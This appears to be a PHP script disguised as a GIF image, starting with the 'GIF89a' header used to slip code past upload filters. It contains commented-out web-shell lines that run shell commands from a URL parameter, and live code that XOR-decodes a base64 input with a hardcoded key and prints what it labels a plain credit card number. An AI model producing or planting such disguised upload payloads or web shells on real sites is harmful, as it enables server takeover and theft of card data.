GIF89a
<?php
  // $cmd = $_GET['cmd'];
  // echo system($cmd);

  $encoded_base64 = $_GET['code'];
  $XOR_KEY = 'daylaxorkey1234';

  function xorString($string, $key) {
      for($i = 0; $i < strlen($string); $i++) 
          $string[$i] = ($string[$i] ^ $key[$i % strlen($key)]);
      return $string;
  }

  $plain_credit_card = xorString(base64_decode($encoded_base64), $XOR_KEY);
  echo $plain_credit_card;

?>